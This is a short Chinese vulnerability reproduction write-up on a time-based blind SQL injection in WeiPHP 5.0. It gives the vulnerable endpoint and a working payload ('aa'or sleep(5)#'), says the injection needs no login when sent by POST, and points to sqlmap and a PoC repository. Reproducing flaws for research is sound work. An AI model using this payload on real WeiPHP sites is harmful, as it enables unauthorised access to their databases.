# WeiPHP5.0 SQL注入漏洞1

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

`WeiPHP5.0`是在2019年停止更新的一个系统，漏洞挺多的，跟着复现分析一下，这里复现一下 `WeiPHP5.0`的一处`SQL`注入漏洞

## 漏洞影响

`WeiPHP5.0`最新版

可以据此下载

https://www.weiphp.cn/doc/download_source_installation.html

## 漏洞复现

需要一个普通用户权限登录（好像也可以不用），然后访问链接并抓包

```php
/index.php/material/Material/material_lists
title=aa%27or%20sleep(5)%23
```

不登录时需要使用 `post` ，如果使用 `get`会直接跳转，然后进行延时操作，注意右下角

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650814616996-67b8d17c-1b34-4b28-aec0-86d0e6b724fc.png)

用 `sqlmap`跑

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650894325627-aae86b37-51e3-4a20-b61b-a5587045462a.png)

## 总结

关于这个权限问题，实际上不用任何用户登录也是可以注入的，但必须使用 `post`的时候才可以。由于后面还有其他的数据库操作语句，这里只好使用盲注。

## 参考链接

- https://igml.top/2019/10/30/weiphp5-0/



`github` 链接：`https://github.com/N0puple/vulPOC`

想要获取更多资讯，或者获取文中环境可以关注公众号 “安全漏洞复现”，回复 “漏洞环境”

